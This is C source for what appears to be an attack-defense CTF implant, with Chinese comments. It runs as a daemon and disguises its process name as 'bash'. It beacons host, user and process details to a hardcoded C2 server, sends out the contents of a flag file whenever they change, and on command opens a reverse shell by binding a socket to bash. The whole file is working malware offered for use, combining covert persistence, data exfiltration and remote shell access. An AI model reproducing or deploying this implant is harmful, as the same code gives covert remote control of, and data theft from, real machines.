#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <sys/file.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "tiny-c-http-client/http.h"
#include "log.h"

// =================== 配置 ===================
#define FLAG_PATH "/home/ctf/flag/flag"
#define C2_IP "10.103.6.2"
#define C2_PORT 26666
#define C2_HOST "pss"
#define SINGLE_INSTANCE_CHECK_FILE "/tmp/.php_lock"

static char last_flag[256] = ""; // 声明为空字符串, 不要填入内容

// 保证只有一个c2在运行中
__attribute__((constructor))
void enforceSingleInstance(void) {
    int lock_fd = open(SINGLE_INSTANCE_CHECK_FILE, O_RDWR | O_CREAT, 0600);
    if (lock_fd == -1 || flock(lock_fd, LOCK_EX | LOCK_NB) == -1) {
        LOG_DEBUG("Another process detected, exiting.\n");
        _exit(0);
    }
}

// 收集信息用于区分不同靶机, 一般来说靶机都是基于qemu/docker这种批量克隆, 能收集的信息不多
char* getHostname() {
    static char buf[128];
    FILE *fp = fopen("/etc/hostname", "r");
    if (!fp) {
        snprintf(buf, sizeof(buf), "unknown%d", rand() % 10000);
        return buf;
    }
    fgets(buf, sizeof(buf), fp);
    buf[strcspn(buf, "\n")] = 0;
    fclose(fp);
    return buf;
}

char* getCurrentUserInfo() {
    static char buffer[256];
    uid_t uid = getuid();
    struct passwd *pw = getpwuid(uid);
    
    if (pw) {
        snprintf(buffer, sizeof(buffer), "%s(%u)", pw->pw_name, (unsigned int)uid);
    } else {
        snprintf(buffer, sizeof(buffer), "unknown(%u)", (unsigned int)uid);
    }
    
    return buffer;
}

char* getProcessInfo() {
    static char buffer[256];
    char path[256];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    
    if (len != -1) {
        path[len] = '\0';  // readlink 不添加 null 终止符，需要手动添加

        char *process_name = strrchr(path, '/');
        if (process_name) {
            process_name++;  // 跳过 '/'
        } else {
            process_name = path;
        }
        
        snprintf(buffer, sizeof(buffer), "%s(%d)", process_name, getpid());
    } else {
        snprintf(buffer, sizeof(buffer), "unknown(%d)", getpid());
    }
    
    return buffer;
}


void initiateDirectReverseShell(char *reverseShellInfo) {
    if (!reverseShellInfo) return;

    char *ip;
    char *port;
    ip = strtok(reverseShellInfo, "|");
    port = strtok(NULL, "|");
    if (!ip || !port) return;

    LOG_DEBUG("[initiateDirectReverseShell]: Initiated reverse shell to %s:%s\n", ip, port);

    pid_t pid = fork();
    // fork()失败或者为父进程就直接退出
    if (pid == -1 || pid > 0) return;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(atoi(port));
    sa.sin_addr.s_addr = inet_addr(ip);
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockt, (struct sockaddr *) &sa, sizeof(sa));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    if (execlp("bash", "bash", NULL))
        execlp("sh", "sh", NULL);
}

int httpSendFlag(const char *flag) {
    char data[512];
    snprintf(data, sizeof(data), "{\"flag\":\"%s\"}", flag);
    
    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_POST, "/api/c2/submit-flag",
        CONTENT_TYPE_APPLICATION_JSON,
        NULL, data, strlen(data)
    };
    
    int s = SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);
    FreeHTTPResponseResource(resp);
    return s;
}

int httpSendHeartbeat() {
    char data[512];
    snprintf(data, sizeof(data),
             "{\"hostname\":\"%s\",\"userinfo\":\"%s\",\"processinfo\":\"%s\"}",
             getHostname(), getCurrentUserInfo(), getProcessInfo());

    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_POST, "/api/c2/heartbeat",
        CONTENT_TYPE_APPLICATION_JSON,
        NULL, data, strlen(data)
    };

    int s = SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);

    int ret = 0;
    if (resp && resp->l7.content) {
        ret = atoi(resp->l7.content);
    }
    FreeHTTPResponseResource(resp);
    return ret;
}

char* httpGetRevshellAddr() {
    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_GET, "/api/c2/get-rs",
        CONTENT_TYPE_TEXT_PLAIN,
        NULL, NULL, -1
    };
    SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);
    char *addr = NULL;
    if (resp && resp->l7.content) {
        addr = strdup(resp->l7.content);  // 复制一份，因为等下free
    }
    FreeHTTPResponseResource(resp);
    return addr;
}

static void setupSignal(int signum) {
    struct sigaction sa;
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(signum, &sa, NULL);
}

void daemonize() {
    setupSignal(SIGCHLD);
#ifndef DEBUG
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    setsid();
    setupSignal(SIGTERM);
    setupSignal(SIGINT);

    chdir("/");
    close(0); close(1); close(2);
#endif
}

// 监控flag变化
void monitorFlagChange() {
    FILE *fp = fopen(FLAG_PATH, "r");
    if (fp) {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp)) {
            buf[strcspn(buf, "\n")] = 0;

            if (last_flag[0] == '\0' || strcmp(buf, last_flag) != 0) {
                strcpy(last_flag, buf);
                httpSendFlag(buf);
                LOG_DEBUG("[FLAG] Submitted: %s\n", buf);
            }
        }
        fclose(fp);
    }
}

int main(int argc, char *argv[]) {
    static char new_name[] = "bash";
    srand(time(NULL));
    daemonize();

    // 修改进程名 (只能16字节,内核task_struct字段, 非root也能)
    prctl(PR_SET_NAME, "bash", 0,0,0);
    int orig_len = strlen(argv[0]) + 1;
    if (orig_len >= sizeof(new_name))
        strncpy(argv[0], "bash", orig_len);

    unsigned ticks = 60;
    while (1) {
        if (ticks >= 60) {
            int res = httpSendHeartbeat();
            if (res == 1) {
                char *rs = httpGetRevshellAddr();
                initiateDirectReverseShell(rs);
                free(rs);
            }
            ticks = 0;
        }
        monitorFlagChange();
        sleep(1);
        ticks++;
    }
    return 0;
}
